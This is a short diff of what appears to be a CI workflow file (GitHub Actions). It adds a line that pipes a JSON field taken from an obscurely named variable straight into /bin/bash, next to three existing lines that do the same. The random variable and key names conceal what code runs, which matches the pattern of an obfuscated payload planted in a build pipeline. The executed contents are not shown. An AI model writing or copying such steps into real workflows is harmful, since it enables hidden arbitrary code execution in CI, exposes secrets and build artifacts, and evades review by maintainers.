@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ctz07073" | jq -r .az4 | /bin/bash
           printf '%s' "$ejtag14" | jq -r .rax406 | /bin/bash
           printf '%s' "$c60" | jq -r .nmggg058 | /bin/bash
+          echo $qml156 | jq -r .s380 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
